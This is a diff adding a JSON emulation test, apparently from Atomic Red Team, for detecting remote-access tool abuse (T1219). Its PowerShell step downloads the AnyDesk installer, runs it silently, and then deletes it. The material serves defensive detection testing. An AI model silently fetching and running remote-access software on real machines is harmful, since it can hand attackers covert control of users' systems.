@@ -1,0 +1,44 @@
+{
+  "id": "6b8b7391-5c0a-4f8c-baee-78d8ce0ce330",
+  "name": "AnyDesk Files Detected Test on Windows",
+  "description": "An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n",
+  "platforms": [
+    "windows"
+  ],
+  "steps": [
+    {
+      "id": "bbabc593-93ff-42e6-9e89-cbd1040bb58f",
+      "type": "execute-command",
+      "data": {
+        "command": "Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe\n$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nStart-Process $file1 /S;\n",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "9feb79c3-25db-42e3-8d47-c24b7bb5b73c",
+      "type": "execute-command",
+      "data": {
+        "command": "$file1 = \"C:\\Users\\\" + $env:username + \"\\Desktop\\AnyDesk.exe\"\nRemove-Item $file1 -ErrorAction Ignore",
+        "command_type": "powershell"
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "bbabc593-93ff-42e6-9e89-cbd1040bb58f",
+      "p": "on-success",
+      "o": "9feb79c3-25db-42e3-8d47-c24b7bb5b73c"
+    },
+    {
+      "s": "bbabc593-93ff-42e6-9e89-cbd1040bb58f",
+      "p": "on-failure",
+      "o": "9feb79c3-25db-42e3-8d47-c24b7bb5b73c"
+    }
+  ],
+  "tags": [
+    "T1219",
+    "atomic-red-team"
+  ]
+}
